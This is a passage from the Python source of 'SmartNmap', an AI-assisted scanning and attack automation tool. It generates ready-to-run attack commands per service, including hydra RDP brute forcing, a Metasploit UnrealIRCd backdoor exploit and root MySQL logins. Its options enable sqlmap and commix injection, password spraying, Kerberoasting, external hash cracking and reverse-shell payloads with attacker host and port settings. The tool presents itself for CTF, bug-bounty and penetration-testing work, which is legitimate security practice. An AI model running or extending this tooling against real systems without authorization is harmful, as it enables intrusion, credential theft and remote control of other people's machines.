            cmds.append(f"mkdir /tmp/nfs && mount -t nfs {target}:/SHARE /tmp/nfs")

        elif 'mysql' in service:
            cmds.append(f"# MySQL ({port})")
            cmds.append(f"mysql -h {target} -P {port} -u root")

        elif 'rdp' in service or 'ms-wbt' in service:
            cmds.append(f"# RDP ({port})")
            cmds.append(f"xfreerdp /v:{target}:{port} /u:administrator")
            cmds.append(f"hydra -L users.txt -P passwords.txt rdp://{target}")

        elif 'redis' in service:
            cmds.append(f"# Redis ({port})")
            cmds.append(f"redis-cli -h {target} -p {port} INFO")

        elif 'irc' in service:
            cmds.append(f"# IRC ({port})")
            if 'unrealircd' in product:
                cmds.append(f"msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {target}; run'")

    # Vuln-specific commands
    for v in vulns:
        if v['exploit'] and v['exploit'] not in '\n'.join(cmds):
            cmds.append(f"# {v['desc']}")
            cmds.append(f"{v['exploit']}")

    return cmds

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# INSTALL SCRIPTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def install_scripts():
    """Install/update extra NSE scripts from GitHub."""
    section("NSE Script Installer")
    nse_dir = find_nse_dir()
    info(f"NSE directory: {nse_dir}")

    scripts_to_install = [
        {
            'name': 'vulners.nse',
            'url': 'https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse',
            'check': nse_dir / 'vulners.nse',
        },
        {
            'name': 'vulscan (git clone)',
            'url': 'https://github.com/scipag/vulscan.git',
            'check': nse_dir / 'vulscan' / 'vulscan.nse',
            'git': True,
            'dest': nse_dir / 'vulscan',
        },
        {
            'name': 'nmap-nse-vulnerability-scripts (git clone)',
            'url': 'https://github.com/nccgroup/nmap-nse-vulnerability-scripts.git',
            'check': nse_dir / 'nccgroup-vuln',
            'git': True,
            'dest': nse_dir / 'nccgroup-vuln',
        },
    ]

    single_scripts = [
        ('freevulnsearch.nse',
         'https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse'),
        ('nmap-log4shell.nse',
         'https://raw.githubusercontent.com/giterlizzi/nmap-log4shell/main/log4shell.nse'),
        ('http-spring4shell.nse',
         'https://raw.githubusercontent.com/gpiechnik2/nmap-spring4shell/main/http-spring4shell.nse'),
    ]

    for s in scripts_to_install:
        if s['check'].exists():
            good(f"{s['name']}: already installed")
        else:
            if s.get('git'):
                warn(f"{s['name']}: not installed")
                info(f"  Install: git clone {s['url']} {s.get('dest', '')}")
                try:
                    subprocess.run(['git', 'clone', s['url'], str(s['dest'])],
                                   capture_output=True, timeout=60)
                    if s['check'].exists():
                        good(f"  Installed {s['name']}")
                    else:
                        error(f"  Failed to install {s['name']}")
                except Exception as e:
                    error(f"  git clone failed: {e}")
                    info(f"  Manual: git clone {s['url']} {s.get('dest','')}")
            else:
                warn(f"{s['name']}: not installed")
                try:
                    info(f"  Downloading {s['name']}...")
                    req = Request(s['url'])
                    with urlopen(req, timeout=15) as r:
                        content = r.read()
                    dest = nse_dir / s['name']
                    dest.write_bytes(content)
                    good(f"  Installed {s['name']}")
                except Exception as e:
                    error(f"  Download failed: {e}")
                    info(f"  Manual: curl -o {nse_dir}/{s['name']} {s['url']}")

    for name, url in single_scripts:
        dest = nse_dir / name
        if dest.exists():
            good(f"{name}: already installed")
        else:
            try:
                info(f"Downloading {name}...")
                req = Request(url)
                with urlopen(req, timeout=15) as r:
                    content = r.read()
                dest.write_bytes(content)
                good(f"Installed {name}")
            except Exception as e:
                warn(f"Could not download {name}: {e}")
                info(f"  Manual: curl -o {nse_dir}/{name} {url}")

    # Update script db
    info("Updating nmap script database...")
    try:
        subprocess.run(['nmap', '--script-updatedb'], capture_output=True, timeout=30)
        good("Script database updated")
    except Exception:
        warn("Could not update script database - run: nmap --script-updatedb")

    # Also suggest tools to install
    subsection("Recommended Tools")
    tool_installs = {
        'nikto': 'apt install nikto',
        'gobuster': 'apt install gobuster',
        'enum4linux': 'apt install enum4linux',
        'smbclient': 'apt install smbclient',
        'smbmap': 'pip3 install smbmap',
        'showmount': 'apt install nfs-common',
        'whatweb': 'apt install whatweb',
        'wpscan': 'gem install wpscan',
        'hydra': 'apt install hydra',
        'nuclei': 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
        'ffuf': 'apt install ffuf',
        'searchsploit': 'apt install exploitdb',
    }
    tools = check_tools()
    for tool, cmd in tool_installs.items():
        if tools.get(tool):
            good(f"{tool}: installed")
        else:
            warn(f"{tool}: NOT installed  =>  {cmd}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ARGUMENT PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_args():
    p = argparse.ArgumentParser(
        description=f'SmartNmap v{VERSION} - AI-Driven Intelligent Nmap Reconnaissance',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 10.0.0.1                       # Standard scan (top 1000 ports)
  %(prog)s 10.0.0.1 --full                # Full port scan (-p-)
  %(prog)s 10.0.0.1 --ctf -ai             # CTF mode with AI analysis
  %(prog)s target.com --bb -ai            # Bug bounty mode (safer timing)
  %(prog)s 10.0.0.1 --ports 21,22,80,445  # Skip port discovery
  %(prog)s 10.0.0.1 --fast                # Use rustscan/masscan for speed
  %(prog)s 10.0.0.1 --vhosts               # Enable vhost enumeration
  %(prog)s --install-scripts              # Install extra NSE scripts

Setup:
  - Set GEMINI_API_KEY env var for AI, or put key in ~/.config/smartnmap/config.json
  - Run `./install.sh` to install NSE scripts and recommended tools
        """)

    p.add_argument('target', nargs='?', help='Target IP, CIDR or hostname')

    scan = p.add_argument_group('Scanning')
    scan.add_argument('--full', action='store_true', help='Full port scan (-p-, 1-65535)')
    scan.add_argument('--quick', action='store_true', help='Quick scan (top 1000 ports, default)')
    scan.add_argument('--fast', action='store_true',
                      help='Use masscan/rustscan for ultra-fast port discovery (if installed)')
    scan.add_argument('--top-ports', type=int, default=0, help='Scan top N ports')
    scan.add_argument('--ports', help='Comma-separated ports (skip phase 1)')
    scan.add_argument('-t', '--timing', default='T4', choices=['T1','T2','T3','T4','T5'],
                      help='Nmap timing template (default: T4)')
    scan.add_argument('--stealth', action='store_true', help='Stealth mode (T2, slower)')
    scan.add_argument('--udp', action='store_true', help='Include UDP scan')
    scan.add_argument('--no-retry', action='store_true', help='Disable fallback port probe')
    scan.add_argument('-6', '--ipv6', dest='ipv6', action='store_true', help='Scan via IPv6 (-6)')
    scan.add_argument('--source-port', type=int, help='Use source port (-g)')
    scan.add_argument('--decoys', help='Use nmap decoys (-D) e.g. RND:10 or ip1,ip2')

    ai = p.add_argument_group('AI')
    ai.add_argument('-ai', '--ai', action='store_true',
                    help='Enable AI analysis (requires GEMINI_API_KEY or Puter token)')
    ai.add_argument('--api-key', default=os.environ.get('GEMINI_API_KEY', GEMINI_DEFAULT_KEY),
                    help='Gemini API key (default: from env/config)')
    ai.add_argument('--puter-token', default=os.environ.get('PUTER_AUTH_TOKEN', ''),
                    help='Puter auth token for Qwen AI fallback')
    ai.add_argument('--puter-model', default='qwen/qwen3.6-plus',
                    help='Puter/Qwen model (default: qwen/qwen3.6-plus)')

    mode = p.add_argument_group('Mode')
    mode.add_argument('--ctf', action='store_true', help='CTF mode (aggressive, flag hunting)')
    mode.add_argument('--bb', action='store_true', help='Bug bounty mode (safer scans)')

    web = p.add_argument_group('Web / Vhost')
    web.add_argument('--vhosts', action='store_true',
                     help='Enable vhost/subdomain enumeration for HTTP services')
    web.add_argument('--hostname', help='Manual hostname to try for vhosts (sets Host: header)')
    web.add_argument('--vhost-wordlist', help='Wordlist for vhost/subdomain brute (ffuf)')
    web.add_argument('--update-hosts', action='store_true',
                     help='Append discovered hostnames to /etc/hosts (requires root)')

    offense = p.add_argument_group('Offensive / Active (safe-by-default; gated)')
    offense.add_argument('--active', action='store_true',
                         help='Enable active/intrusive tools: sqlmap, dalfox, commix, ssrfmap, '
                              'hydra/kerbrute/netexec brute (also on in --ctf). Off by default.')
    offense.add_argument('--no-crawl', action='store_true',
                         help='Skip web crawling (katana/gau/waybackurls/arjun) and the URL/param corpus')
    offense.add_argument('--oob', action='store_true',
                         help='Use interactsh OOB canary for blind SSRF/RCE (needs interactsh-client)')
    offense.add_argument('--creds', metavar='USER:PASS', default='',
                         help='Credentials for authenticated AD collection (Kerberoast, BloodHound)')
    offense.add_argument('--userlist', help='Username wordlist for brute/spray (hydra, kerbrute, netexec)')
    offense.add_argument('--passlist', help='Password wordlist for brute/spray')
    offense.add_argument('--domain', help='AD/Kerberos domain (auto-detected from LDAP if omitted)')
    offense.add_argument('--crack', action='store_true',
                         help='Look up captured hashes on crackcrypt.com (external egress; also on with --active)')
    offense.add_argument('--lhost', help='Attacker IP for generated reverse-shell payloads')
    offense.add_argument('--lport', help='Attacker port for reverse-shell payloads (default 4444)')
    offense.add_argument('--mqtt-listen', help='Seconds to subscribe to MQTT topics (default 45)')
    offense.add_argument('--catch-wait', help='Seconds to wait for a reverse-shell callback / share auto-processing (default 280)')

    output = p.add_argument_group('Output')
    output.add_argument('-o', '--output', help='Output directory')
    output.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    output.add_argument('--json', action='store_true', help='Export JSON summary')
    output.add_argument('--markdown', action='store_true', default=True,
                        help='Export Markdown report (default)')
    output.add_argument('--no-stream', action='store_true',
                        help='Disable live output streaming from nmap')

    mgmt = p.add_argument_group('Management')
    mgmt.add_argument('--install-scripts', action='store_true', help='Install extra NSE scripts')
    mgmt.add_argument('--no-vuln', action='store_true', help='Skip vulnerability scan (phase 4)')
    mgmt.add_argument('--no-extra', action='store_true', help='Skip supplementary tools (phase 5)')
    mgmt.add_argument('--no-nuclei', action='store_true', help='Skip nuclei scan')
    mgmt.add_argument('--no-gobuster', action='store_true', help='Skip gobuster/ffuf dir brute')
    mgmt.add_argument('--resume', action='store_true',
                      help='Resume previous scan (reuses existing XML files in --output dir)')
    mgmt.add_argument('--skip-nse', action='store_true',
                      help='Skip phase 3 targeted NSE (fast path to phase 5 tools; good with --resume)')
    mgmt.add_argument('--version', action='version', version=f'SmartNmap {VERSION}')

    args = p.parse_args()

    if args.install_scripts:
        return args

    if not args.target:
        p.error('target is required (unless using --install-scripts)')

    # Compute scan mode
    if args.full and args.quick:
        p.error('--full and --quick are mutually exclusive')
    if args.top_ports:
        args.full = False
        args.quick = False
    if args.no_stream:
        global VERBOSE_STREAM
        VERBOSE_STREAM = False

    if args.stealth:
        args.timing = 'T2'
    if args.bb and args.timing in ['T4', 'T5']:
        args.timing = 'T3'
    if args.ctf and not args.stealth:
        args.timing = 'T4'

    return args


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def expand_cidr_targets(target):
    """Expand CIDR/range to list of individual target IPs.
    Returns (is_range, list_of_targets).
    - Non-CIDR input: (False, [target])
    - Single /32 CIDR: (False, [ip])
    - Small CIDR (<=32 addresses, ie /27 or smaller): (True, [list of host IPs])
    - Larger CIDR: (True, [network_str]) – caller should run host discovery first.
    """
    try:
        net = ipaddress.ip_network(target, strict=False)
    except ValueError:
        return False, [target]
    if net.num_addresses == 1:
        return False, [str(net.network_address)]
    if net.num_addresses > 32:
        return True, [str(net)]
    if net.num_addresses > 2:
        hosts = [str(h) for h in net.hosts()]
    else:
        hosts = [str(net.network_address)]
    return True, hosts


def host_discovery_cidr(target, outdir, timeout=180):
    """Run nmap host discovery for a CIDR range. Returns list of alive IPs.
    Uses -Pn + fast TCP probe fallback for environments that block ICMP.
    """
    info(f"Host discovery in {target}...")
    xml = outdir / 'host_discovery.xml'
    rc, out = run_nmap(['-sn', '-n', '--min-rate', '500', target], xml,
                      'Host Discovery', timeout=timeout)
    parsed = parse_xml(xml)
    alive_hosts = parsed.get('alive_hosts', [])
    # Fallback: TCP probe against common ports (for ICMP-blocked environments)
    if not alive_hosts:
        info("ICMP ping-sweep found 0 hosts - trying TCP SYN probe on common ports")
        xml2 = outdir / 'host_discovery_tcp.xml'
        run_nmap(['-sn', '-Pn', '-PS21,22,80,443,3389,445,8080', '-n',
                  '--min-rate', '500', target],
                 xml2, 'Host Discovery TCP', timeout=timeout)
        alive_hosts = parse_xml(xml2).get('alive_hosts', [])
    return alive_hosts


def main():
    args = parse_args()
    banner()

    # Handle --install-scripts
    if args.install_scripts:
        install_scripts()
        return

    target = args.target
    # A provided Gemini key (flag/env/config) enables AI on its own; --ai also
    # forces puter.js and AI advisor calls at every phase.
    api_key = args.api_key or None
    puter_token = args.puter_token if args.ai else None
    if args.ai and args.puter_model:
        global _PUTER_MODEL
        _PUTER_MODEL = args.puter_model

    # Validate target
    if not is_valid_target(target):
        error(f"Invalid target: {target}")
        error("Expected: IP address (1.2.3.4), CIDR (1.2.3.0/24) or hostname")
        sys.exit(2)

    # CIDR / multi-target handling
    is_range, targets = expand_cidr_targets(target)
    if is_range:
        # For large ranges: do host discovery first, then scan alive hosts
        if len(targets) == 1 and '/' in targets[0]:
            network_str = targets[0]
            warn(f"Large CIDR {network_str} - running host discovery first")
            safe_target = re.sub(r'[/:]', '_', network_str)
            base = Path.home() / 'smartnmap_results'
            tmp_out = base / safe_target / datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            tmp_out.mkdir(parents=True, exist_ok=True)
            alive = host_discovery_cidr(network_str, tmp_out)
            if not alive:
                error("No alive hosts found in range")
                return
            good(f"Found {len(alive)} alive host(s): {', '.join(alive[:20])}{'...' if len(alive) > 20 else ''}")
            (tmp_out / 'alive_hosts.txt').write_text('\n'.join(alive))
            if len(alive) > 50:
                warn(f"Too many hosts ({len(alive)}) - saving list only. Re-run per host.")
                info(f"Host list: {tmp_out}/alive_hosts.txt")
                return
            targets = alive

        if len(targets) > 1:
            info(f"Target is a range ({target}) - scanning {len(targets)} host(s) sequentially")
            section(f"Multi-target scan: {len(targets)} hosts")
            results_summary = []
            for idx, t in enumerate(targets, 1):
                info(f"[{idx}/{len(targets)}] Starting scan of {t}")
                sub_args = argparse.Namespace(**vars(args))
                sub_args.target = t
                try:
                    summary = _run_single_target(t, sub_args, api_key, puter_token)
                    if summary:
                        results_summary.append(summary)
                except SystemExit:
                    warn(f"Host {t} scan failed (SystemExit) - continuing")
                except KeyboardInterrupt:
                    warn("Interrupted - stopping multi-host scan")
                    break
                except Exception as e:
                    warn(f"Host {t}: {e}")
            if results_summary:
                section(f"Multi-Target Summary ({len(results_summary)} hosts scanned)")
                print(f"  {'Host':<18} {'Ports':<6} {'Services':<10} {'Vulns':<6}")
                for s in results_summary:
                    print(f"  {s.get('target','?'):<18} {s.get('ports',0):<6} {s.get('services',0):<10} {s.get('vulns',0):<6}")
            return
        elif len(targets) == 1:
            target = targets[0]
    _run_single_target(target, args, api_key, puter_token)


def _run_single_target(target, args, api_key, puter_token):
    """Run the full scan pipeline for a single target. Returns a summary dict."""
    # Resolve hostname if needed
    resolved_ip, input_hostname = resolve_target(target)
    if input_hostname:
        info(f"Resolved {C.Bo}{input_hostname}{C.Re} -> {C.Y}{resolved_ip}{C.Re}")

    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')

    # Detect snap-confined nmap (cannot write outside $HOME/tmp)
    nmap_real = ''
    try:
        nmap_path = shutil.which('nmap') or ''
        nmap_real = os.path.realpath(nmap_path) if nmap_path else ''
    except Exception:
        pass
    snap_nmap = '/snap/' in nmap_real

    # Output directory (always use absolute path; prefer $HOME for snap-confined nmap)
    if args.output:
        outdir = Path(args.output).expanduser().resolve()
    else:
        safe_target = re.sub(r'[/:]', '_', target)
        base = Path.home() / 'smartnmap_results'
        outdir = (base / safe_target / timestamp).resolve()
    try:
        outdir.mkdir(parents=True, exist_ok=True)
    except PermissionError as e:
        error(f"Cannot create output directory {outdir}: {e}")
        sys.exit(1)

    # Check snap-nmap can write here: /snap nmap cannot write outside $HOME on many systems
    if snap_nmap:
        home = str(Path.home())
        od_str = str(outdir)
        if not (od_str.startswith(home) or od_str.startswith('/tmp/snap-private-tmp')):
            warn(f"Snap-confined nmap detected ({nmap_real}) - output path {outdir}")
            warn(f"Snap nmap cannot write outside $HOME. Moving output to ~/smartnmap_results/...")
            safe_target = re.sub(r'[/:]', '_', target)
            outdir = (Path.home() / 'smartnmap_results' / safe_target / timestamp).resolve()
            outdir.mkdir(parents=True, exist_ok=True)

    # Create 'latest' symlink for convenience
    parent = outdir.parent
    latest = parent / 'latest'
    try:
        if latest.is_symlink() or latest.exists():
            latest.unlink()
        latest.symlink_to(outdir.name)
    except (OSError, NotImplementedError):
        pass

    # Determine scan mode label
    if args.full:
        mode_label = 'Full -p-'
    elif args.top_ports:
        mode_label = f'Top-{args.top_ports}'
    else:
        mode_label = 'Quick (top 1000)'

    # Print config
    ai_providers = []
    if api_key:
        ai_providers.append('Gemini')
    if _puter_pkg_available():
        ai_providers.append(f'Puter/GPT ({_PUTER_MODEL})')
    ai_label = ' + '.join(ai_providers) if ai_providers else 'Disabled (no Gemini key, no puter.js)'

    info(f"Target:     {C.Bo}{C.Y}{target}{C.Re}")
    if input_hostname and resolved_ip != target:
        info(f"Resolved:   {C.Y}{resolved_ip}{C.Re}")
    info(f"Output:     {C.Y}{outdir}{C.Re}")
    info(f"Timing:     {C.Y}{args.timing}{C.Re}")
    info(f"Mode:       {C.Y}{mode_label}{' + UDP' if args.udp else ''}{' + fast' if args.fast else ''}{C.Re}")
    info(f"AI:         {C.Y}{ai_label}{C.Re}")
    if args.ctf:
        info(f"CTF Mode:   {C.G}ENABLED{C.Re}")
    if args.bb:
        info(f"BB Mode:    {C.G}ENABLED (safe scans){C.Re}")
    if args.vhosts:
        info(f"VHosts:     {C.G}ENABLED{C.Re}")

    # Check tools
    tools = check_tools()
    available = sorted([t for t, p in tools.items() if p])
    info(f"Tools:      {C.Di}{', '.join(available[:15]) + ('...' if len(available) > 15 else '') if available else 'none'}{C.Re}")
    info(f"NSE Dir:    {C.Di}{NSE_DIR}{C.Re}")

    # Check nmap
    try:
        r = subprocess.run(['nmap', '--version'], capture_output=True, text=True, timeout=5)
        nmap_ver = r.stdout.split('\n')[0] if r.stdout else 'unknown'
        info(f"Nmap:       {C.Di}{nmap_ver}{C.Re}")
    except Exception:
        error("nmap not found!")
        sys.exit(1)

    # Write scan metadata for resume support
    scan_meta = {
        'version': VERSION,
        'target': target,
        'resolved_ip': resolved_ip,
        'hostname': input_hostname,
        'args': {k: v for k, v in vars(args).items() if not callable(v)},
        'start_time': datetime.datetime.now().isoformat(),
    }
    try:
        (outdir / 'scan_meta.json').write_text(json.dumps(scan_meta, indent=2, default=str))
    except Exception:
        pass

    # Initialize loot tracker
    loot = LootTracker()

    # ── Phase 1: Port Discovery ──
    if args.ports:
        open_ports = sorted([int(p.strip()) for p in args.ports.split(',') if p.strip().isdigit()])
        good(f"Using provided ports: {open_ports}")
    elif args.resume and (outdir / 'phase1_tcp.xml').exists():
        good(f"[resume] Reusing phase1_tcp.xml")
        open_ports = sorted(parse_xml(outdir / 'phase1_tcp.xml').get('ports', []))
    else:
        open_ports = phase1_ports(target, outdir, args, api_key)

    if not open_ports:
        error("No open ports found. Exiting.")
        return

    # ── Phase 2: Service Detection ──
    if args.resume and (outdir / 'phase2_services.xml').exists():
        good(f"[resume] Reusing phase2_services.xml")
        services = parse_xml(outdir / 'phase2_services.xml').get('services', {})
    else:
        services = phase2_services(target, open_ports, outdir, args, api_key)

    if not services:
        warn("No services identified - creating minimal entries")
        services = {}
        for p in open_ports:
            services[p] = {
                'port': p, 'proto': 'tcp', 'service': '', 'product': '',
                'version': '', 'extra': '', 'tunnel': '', 'scripts': {},
            }

    vulns = check_vulns(services)

    # ── Hostname discovery from TLS/HTTP ──
    hostnames = []
    if any(p in (443, 8443, 9443) or services[p].get('tunnel') == 'ssl' for p in services):
        subsection("Hostname Discovery (TLS SAN / HTTP redirect)")
        hostnames = extract_hostnames_from_services(services, target, outdir)
        if input_hostname:
            hostnames = sorted(set(hostnames) | {input_hostname})
        if hostnames:
            good(f"Discovered hostname(s): {', '.join(hostnames[:10])}")
            # Write discovered hostnames
            (outdir / 'hostnames.txt').write_text('\n'.join(hostnames))
            if loot:
                for h in hostnames:
                    loot.add('notes', f"hostname: {h}")
            # /etc/hosts suggestion
            if not input_hostname:
                print(f"\n  {C.Y}Add to /etc/hosts:{C.Re}")
                for h in hostnames[:5]:
                    print(f"    {resolved_ip} {h}")
            if args.update_hosts:
                resolve_and_update_hosts(resolved_ip, hostnames, apply=True)

    # ── Searchsploit: Auto-lookup after service detection ──
    sploit_results = {}
    if shutil.which('searchsploit'):
        subsection("Searchsploit Auto-Lookup")
        p2_xml = outdir / 'phase2_services.xml'
        if p2_xml.exists():
            nmap_sploit = run_searchsploit_nmap(p2_xml)
            if nmap_sploit.strip():
                info("searchsploit --nmap results:")
                for line in nmap_sploit.strip().split('\n')[:25]:
                    if line.strip():
                        print(f"    {line}")
                (outdir / 'searchsploit_nmap.txt').write_text(nmap_sploit)
        sploit_results = searchsploit_services(services, outdir)
        if sploit_results and loot:
            for query, results in sploit_results.items():
                loot.add('notes', f"Searchsploit: {len(results)} exploit(s) for '{query}'")

    # ── Phase 3: Targeted Scripts ──
    if getattr(args, 'skip_nse', False):
        good("[skip-nse] Skipping phase 3 targeted NSE scans")
        phase3_results = {}
    else:
        phase3_results = phase3_scripts(target, services, outdir, args, api_key, loot)
    for port, svc_data in phase3_results.items():
        if port in services and svc_data.get('scripts'):
            services[port].setdefault('scripts', {}).update(svc_data.get('scripts', {}))

    # Check config-level vulnerabilities from host scripts
    host_scripts = {}
    for xml_file in outdir.glob('phase3_*.xml'):
        parsed = parse_xml(xml_file)
        host_scripts.update(parsed.get('scripts', {}))
    config_vulns = check_config_vulns(services, host_scripts)
    if config_vulns:
        print(f"\n  {C.R}{C.Bo}CONFIGURATION ISSUES DETECTED:{C.Re}")
        for v in config_vulns:
            print(f"    {C.R}{v['desc']}{C.Re}")
            if v['exploit']:
                print(f"    {C.Y}  => {v['exploit']}{C.Re}")
        vulns.extend(config_vulns)

    # ── Phase 4: Vulnerability Scan ──
    if not args.no_vuln:
        p4_vulns = phase4_vuln(target, open_ports, outdir, args, api_key, loot)
        if p4_vulns:
            vulns.extend(p4_vulns)
            good(f"Phase 4 added {len(p4_vulns)} finding(s) to vuln list")

    # ── Phase 5: Supplementary Tools ──
    if not args.no_extra:
        p5_vulns = phase5_tools(target, services, outdir, args, tools, api_key, loot, hostnames=hostnames)
        if p5_vulns:
            vulns.extend(p5_vulns)
            good(f"Phase 5 added {len(p5_vulns)} finding(s) to vuln list")

    # ── Phase 6: Analysis & Report ──
    os_info = []
    p2_xml = outdir / 'phase2_services.xml'
    if p2_xml.exists():
        os_info = parse_xml(p2_xml).get('os', [])

    phase6_analysis(target, services, vulns, outdir, args, api_key, loot, os_info,
                    sploit_results=sploit_results, puter_token=puter_token,
                    hostnames=hostnames)

    # Write end-time
    try:
        scan_meta['end_time'] = datetime.datetime.now().isoformat()
        (outdir / 'scan_meta.json').write_text(json.dumps(scan_meta, indent=2, default=str))
    except Exception:
        pass

    # ── Final Summary ──
    section("SCAN COMPLETE")
    good(f"Target:   {target}")
    good(f"Ports:    {len(open_ports)} open")
    good(f"Services: {len(services)} identified")
    good(f"Vulns:    {len(vulns)} potential")
    if hostnames:
        good(f"Hosts:    {len(hostnames)} hostnames discovered")
    good(f"Output:   {outdir}")
    if latest.exists():
        info(f"  Shortcut: {latest}")
    print(f"\n  {C.Bo}Output files:{C.Re}")
    for f in sorted(outdir.iterdir()):
        try:
            size = f.stat().st_size
        except Exception:
            continue
        label = f"  {f.name}"
        if size > 0:
            print(f"    {C.G}{label:<45}{C.Di}({size:,} bytes){C.Re}")
        else:
            print(f"    {C.Di}{label}{C.Re}")

    return {
        'target': target,
        'ports': len(open_ports),
        'services': len(services),
        'vulns': len(vulns),
        'outdir': str(outdir),
    }


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}  [!] Interrupted by user{C.Re}")
        sys.exit(130)
    except Exception as e:
        error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
